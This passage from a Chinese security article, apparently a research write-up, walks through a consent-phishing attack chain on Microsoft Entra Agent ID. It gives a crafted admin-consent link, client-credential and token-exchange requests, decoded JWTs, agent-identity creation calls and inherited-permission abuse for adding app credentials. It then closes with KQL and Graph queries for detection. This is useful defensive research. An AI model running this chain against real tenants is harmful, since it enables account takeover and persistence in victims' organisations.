owner）、谁能授予权限（管理员同意）。攻防的着力点从拿到一个角色变成分别打到这三条线上的薄弱点。</p><h2 id=\"sec-36\">4.2 案例二：钓鱼</h2><p>诱导用户点击也能拿代理身份来打。套路跟以前对服务主体搞的点击同意来钓鱼差不多，只不过在 Entra Agent ID 里玩法会多几步</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2032%2Ffc612e49-249.png&amp;mode=full&amp;exp=1796169600&amp;sig=59df7d9194422e84\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-37\">1、新建代理蓝图</h3><p>1、攻击者在已控制的租户里配置一个代理蓝图，把想要的权限填进需要访问的资源，再对 Graph 开&nbsp;<code>allAllowed</code>，让蓝图能往下继承权限。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2F99d95c2a-963.png&amp;mode=full&amp;exp=1796169600&amp;sig=217772bab10e0f93\" loading=\"lazy\" decoding=\"async\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2F64e1df50-b49.png&amp;mode=full&amp;exp=1796169600&amp;sig=da4626ef5af3795d\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-38\">2、钓鱼链接</h3><p>2、然后编一条带着蓝图应用 ID 的同意链接，发给别家组织里的管理员。管理员一同意，受害租户里就建出了蓝图主体，权限也跟着给了。<br>对于代理身份来说，授权过程与 OAuth 应用程序的授权过程是差不多的。攻击者搞一个钓鱼链接，让受害者管理员去点。</p><pre><code>`https://login.microsoftonline.com/{tenant}/v2.0/adminconsent?`  \n`client_id={blueprint_id}`  \n`&amp;scope=https://graph.microsoft.com/.default`&nbsp;  \n`&amp;redirect_uri={redirect_uri}`</code></pre><p>受害者访问链接后，如果是点的同意，相当于把外面的蓝图加进自己组织。<br>同意得点两次：一次是同意在本租户建出蓝图主体，一次是把蓝图要的权限在蓝图主体上授权。<br></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2Fe08cf500-a50.png&amp;mode=full&amp;exp=1796169600&amp;sig=ac7f5087718f9ea2\" loading=\"lazy\" decoding=\"async\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2Fb0287ee4-486.png&amp;mode=full&amp;exp=1796169600&amp;sig=4b0db6b52f2735ff\" loading=\"lazy\" decoding=\"async\"></p><p>user consent 只对委派权限生效；蓝图申请的应用权限（<code>.default</code>）始终要管理员同意，且受 verified publisher 约束。如果受害者管理员做了这个设置，普通用户也能同意</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2Fdb247c38-abf.png&amp;mode=full&amp;exp=1796169600&amp;sig=592a1c69b53f810a\" loading=\"lazy\" decoding=\"async\"></p><p><code>https://login.microsoftonline.com/925c2cd8-xxxx-xxxx-xxxx-1257ffd75334/adminconsent?client_id=298c659a-f715-41c1-a5dd-c29f6a022a18</code><br>管理员只要点了链接、把蓝图和权限都同意掉，受害租户里就多了一个蓝图主体。</p><p>受害者同意后，受害者的客户端中会创建一个蓝图主体</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2F38ea6ac2-169.png&amp;mode=full&amp;exp=1796169600&amp;sig=3d5e2b4e2c7c44aa\" loading=\"lazy\" decoding=\"async\"></p><p>默认拥有的权限 <code>AgentIdentity.CreateAsManager</code> 会允许创建代理身份，所以攻击者可以在受害租户里顶着蓝图主体登录，再一个接一个造子代理身份。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2F8f58510d-a70.png&amp;mode=full&amp;exp=1796169600&amp;sig=3f5f1e7e929f7d2c\" loading=\"lazy\" decoding=\"async\"></p><p>也可以通过命令来查</p><pre><code>PS&gt; $BpTokens = Invoke-ClientCredential -TenantId \"925c2cd8-a177-41a5-93f3-1257ffd75334\" -ClientId \"298c659a-f715-41c1-a5dd-c29f6a022a18\" -ClientSecret \"hN[CUT-BY-COMPASS]\"\n\nPS&gt; $BpTokens</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2Ff659c2c6-c6a.png&amp;mode=full&amp;exp=1796169600&amp;sig=87cf0f3575acab94\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-39\">3、创建代理身份</h3><h4 id=\"sec-40\">1）拿蓝图主体令牌</h4><p>用子代理身份的 client ID（appId）</p><pre><code>POST https://login.microsoftonline.com/7c4e1b93-2f6a-4d58-9e0b-3a5d8c1f2b64/oauth2/v2.0/token\nContent-Type: application/x-www-form-urlencoded\n\nclient_id=298c659a-f715-41c1-a5dd-c29f6a022a18\n&amp;client_secret=&lt;my_blueprint_secret&gt;\n&amp;scope=https://graph.microsoft.com/.default\n&amp;grant_type=client_credentials</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2Fac7c13f8-048.png&amp;mode=full&amp;exp=1796169600&amp;sig=1b00d0af0312625c\" loading=\"lazy\" decoding=\"async\"></p><p>会返回一个令牌，jwt解密后如下</p><pre><code> \"app_displayname\": \"BluePhish\",\n  \"appid\": \"&lt;blueprint_app_id&gt;\",\n  \"appidacr\": \"1\",\n  \"idp\": \"https://sts.windows.net/&lt;victim_tenant_id&gt;/“,\n  \"idtyp\": \"app\",\n  \"roles\": [\n  \"AgentIdentity.CreateAsManager\"\n  \"wids\": [\n  \"0997a1d0-0d1d-4acb-b408-d5ca73121e90\"</code></pre><h4 id=\"sec-41\">2）创建新的代理身份</h4><p>用上一条请求换出的令牌，往受害租户里造一个新的代理身份。拿 <code>appId</code></p><pre><code>POST https://graph.microsoft.com/v1.0/servicePrincipals/Microsoft.Graph.AgentIdentity\nAuthorization: Bearer {access_token}\nOData-Version: 4.0\nContent-Type: application/json\n\n{\n \"displayName\": \"{agent_identity_name}\",\n \"agentIdentityBlueprintId\": \"{blueprint_id}\",\n \"sponsors@odata.bind\": [\n   \"https://graph.microsoft.com/v1.0/users/{sponsor_victim_user}\"\n ]\n}</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2033%2Ff248f9b9-401.png&amp;mode=full&amp;exp=1796169600&amp;sig=ab5093d052a701e2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-42\">4、拿代理身份的令牌</h3><p>依旧是两级令牌的手段</p><h4 id=\"sec-43\">1）蓝图换一个交换令牌</h4><pre><code>POST /925c2cd8-a177-41a5-93f3-1257ffd75334/oauth2/v2.0/token HTTP/1.1\nHost: login.microsoftonline.com\nContent-Type: application/x-www-form-urlencoded\nAccept: application/json\n\nclient_id=298c659a-f715-41c1-a5dd-c29f6a022a18&amp;scope=api%3A%2F%2FAzureADTokenExchange%2F.default&amp;fmi_path=1107f355-1cbf-4124-aa0f-babf0445af71&amp;client_secret=hN8~q2XXXXXXXXXX&amp;grant_type=client_credentials</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2034%2F37e8c203-799.png&amp;mode=full&amp;exp=1796169600&amp;sig=5340dc9c3405002f\" loading=\"lazy\" decoding=\"async\"></p><p>jwt 解密后如下</p><pre><code>{\n  \"aud\": \"api://AzureADTokenExchange\",\n  \"iss\": \"https://sts.windows.net/925c2cd8-a177-41a5-93f3-1257ffd75334/\",\n  \"appid\": \"298c659a-f715-41c1-a5dd-c29f6a022a18\",\n  \"oid\": \"&lt;蓝图主体在该租户的对象 ID&gt;\",\n  \"idtyp\": \"app\",\n  \"appidacr\": \"1\",\n  \"tid\": \"925c2cd8-a177-41a5-93f3-1257ffd75334\",\n  \"ver\": \"1.0\"\n}</code></pre><h4 id=\"sec-44\">2）换 Graph 令牌</h4><pre><code>POST /925c2cd8-a177-41a5-93f3-1257ffd75334/oauth2/v2.0/token HTTP/1.1\nHost: login.microsoftonline.com\nContent-Type: application/x-www-form-urlencoded\nAccept: application/json\n\nclient_id=1107f355-1cbf-4124-aa0f-babf0445af71&amp;scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&amp;client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&amp;client_assertion=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...&amp;grant_type=client_credentials</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2034%2Fc647399b-ebc.png&amp;mode=full&amp;exp=1796169600&amp;sig=e959bf777aecb272\" loading=\"lazy\" decoding=\"async\"></p><p>Graph 令牌jwt解密后如下</p><pre><code>{\n  \"aud\": \"https://graph.microsoft.com\",\n  \"iss\": \"https://sts.windows.net/925c2cd8-a177-41a5-93f3-1257ffd75334/\",\n  \"appid\": \"663690df-6339-43d8-95a9-4aa375d9e60b\",\n  \"oid\": \"663690df-6339-43d8-95a9-4aa375d9e60b\",\n  \"appidacr\": \"2\",\n  \"idtyp\": \"app\",\n  \"roles\": [\"Application.ReadUpdate.All\"],\n  \"xms_par_app_azp\": \"298c659a-f715-41c1-a5dd-c29f6a022a18\",\n  \"tid\": \"925c2cd8-a177-41a5-93f3-1257ffd75334\",\n  \"ver\": \"1.0\"\n}</code></pre><h3 id=\"sec-45\">5、利用继承来的权限</h3><p>蓝图开了 Graph 的可继承权限，新造的代理身份就自动拿到蓝图主体已同意的那些权限，例子里是&nbsp;<code>Application.ReadUpdate.All</code>。攻击者再用这个代理身份登录，凭这项权限就能给租户里任何应用注册加凭据。<br>Graph 令牌导入到 GraphRunner，就能方便地在受害者的租户环境中玩，比如把租户里的应用注册扫一遍，读用户，读组。找到自己能动的，给它加一份新凭据。加进去之后，攻击者就能冒这个应用的名。至于能走多远，要看这个应用本身握有哪些权限<br></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2034%2F77074133-84a.png&amp;mode=full&amp;exp=1796169600&amp;sig=93ed3879a47c71ed\" loading=\"lazy\" decoding=\"async\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2034%2Fa7690bce-7ca.png&amp;mode=full&amp;exp=1796169600&amp;sig=c419c144448cdae5\" loading=\"lazy\" decoding=\"async\"></p><p>拥有继承权限的受害者租户的代理身份如图</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2035%2F2d791ea6-05e.png&amp;mode=full&amp;exp=1796169600&amp;sig=a143bf60f0631609\" loading=\"lazy\" decoding=\"async\"></p><h2 id=\"sec-46\">4.3 两条链的共同点</h2><p>总结下来如果把这条链和 MC1506733 放在一起看，结论确实有点不好看。从实际攻击场景来看，公告改变的方向主要是在搭建成本，过去我要建一张蓝图得先有相应角色，但现在任何一个被钓到的普通账号就能建蓝图了。而且创建者自动成为 owner，连给自己加凭据都不需要额外授权。<br>在受害者方面，两次同意相当于 <code>inheritable permissions</code> ，之后的操作落地到蓝图主体上，流水线反复造一个造令牌，造一个子身份就相当于复制一份继承权。此后每一次访问都不再需要任何人同意。</p><h2 id=\"sec-47\">05 检测</h2><h2 id=\"sec-48\">5.1 检测优先级</h2><p>既然存在这个盲区，检查时按以下优先级排：<br>1）首先是蓝图上的新凭据，特别是联合身份凭据，多出来的不是你能对上账的部署，就是被人埋了后门。<br>2）其次是蓝图创建的行为，多出来的蓝图不在正常供给流程里，或创建者根本不是常规主体。<br>3）而后是&nbsp;<code>AgentIdentity.CreateAsManager</code>&nbsp;被用在不该用的地方<br>4）还有蓝图层面的同意：新 OAuth 权限一落到蓝图上，底下所有子对象全跟着继承。</p><h2 id=\"sec-49\">5.2 查询与判读</h2><h3 id=\"sec-50\">查蓝图上的新增凭据</h3><p>在 Entra 审计日志里筛选创建应用对象和给应用对象加凭据这两类动作，再把范围缩小到 Agent ID 相关对象上，从而找出谁创建了蓝图、谁给蓝图加了密钥。KQL 查询语句如下</p><pre><code>AuditLogs | where OperationName has_any (\"Add application\", \"Update application\", \"Certificates and secrets management\") | extend TargetAgentType = tostring(TargetResources[0].agentType), BlueprintId = tostring(TargetResources[0].blueprintId) | where TargetAgentType == \"agenticApp\" or isnotempty(BlueprintId) | extend Actor = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)), tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), tostring(parse_json(tostring(InitiatedBy.app)).displayName)) | project TimeGenerated, OperationName, Actor, BlueprintId, TargetAgentType, Result, CorrelationId | sort by TimeGenerated desc</code></pre><h3 id=\"sec-51\">查蓝图的创建</h3><p>蓝图创建时走创建时走这条操作&nbsp;<code>OperationName == \"Add application\"</code>、<code>agentType = agenticApp</code> 这是判断该对象是 Agent 蓝图的标志</p><pre><code>AuditLogs | where OperationName == \"Add application\" | extend TargetAgentType = tostring(TargetResources[0].agentType) | where TargetAgentType == \"agenticApp\" | extend Actor = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), ActorIP = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress) | project TimeGenerated, Actor, ActorIP, TargetResourceName = tostring(TargetResources[0].displayName), Result, CorrelationId | sort by TimeGenerated desc</code></pre><h3 id=\"sec-52\">查每个蓝图造了多少个子身份</h3><p>子 agent identity 本质就是服务主体，创建时走这条操作 <code>OperationName == \"Add service principal\"</code>、<code>agentType == \"agenticAppInstance\"</code>：这是子身份的标记</p><pre><code>AuditLogs | where OperationName == \"Add service principal\" | extend AgentType = tostring(TargetResources[0].agentType), BlueprintId = tostring(TargetResources[0].blueprintId) | where AgentType == \"agenticAppInstance\" | summarize AgentsCreated = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by BlueprintId | sort by AgentsCreated desc</code></pre><h3 id=\"sec-53\">查子 Agent identity 拿令牌的登录记录</h3><p>查的是子身份用换取资源令牌（例如案例中的 Graph 令牌）的记录，主要是看结果返回的<code>appId</code>（子身份）、<code>resourceDisplayName</code>（它申请了哪个资源的令牌）</p><pre><code>GET https://graph.microsoft.com/beta/auditLogs/signIns?$filter=signInEventTypes%2Fany(t%3A%20t%20eq%20%27servicePrincipal%27)%20and%20agent%2FagentType%20eq%20%27AgentIdentity%27%20and%20createdDateTime%20ge%202026-11-16T00%3A00%3A00Z&amp;$top=50&amp;$orderby=createdDateTime%20desc&amp;$select=createdDateTime,appDisplayName,appId,ipAddress,status,resourceDisplayName,agent</code></pre><h2 id=\"sec-54\">参考</h2><ol><li><p><a href=\"https://learn.microsoft.com/en-us/entra/agent-id/agent-blueprint\">Microsoft Entra Agent ID — Agent identity blueprints</a></p></li><li><p><a href=\"https://learn.microsoft.com/en-us/entra/agent-id/agent-identities\">Microsoft Entra Agent ID — Agent identities</a></p></li><li><p><a href=\"https://learn.microsoft.com/en-us/entra/agent-id/agent-users\">Microsoft Entra Agent ID — Agent users</a></p></li><li><p><a href=\"https://learn.microsoft.com/en-us/entra/agent-id/agent-autonomous-app-oauth-flow\">Agent autonomous app OAuth flow (app-only)</a></p></li><li><p><a href=\"https://learn.microsoft.com/en-us/entra/agent-id/agent-on-behalf-of-oauth-flow\">Agent On-behalf-of OAuth flow</a></p></li><li><p><a href=\"https://learn.microsoft.com/en-us/entra/agent-id/configure-inheritable-permissions-blueprints\">Configure inheritable permissions for agent identity blueprints</a></p></li><li><p><a href=\"https://learn.microsoft.com/en-us/graph/api/resources/agentid-platform-overview\">Microsoft Graph permissions blocked for agents</a></p></li></ol>","original","zhKind","complete","Agent 安全","复现","利用链","Microsoft","https://xz.aliyun.com/news/93443","先知社区",{"_262":263,"_264":-5},"changelogVersion","2026-10-01T08:00","release"]
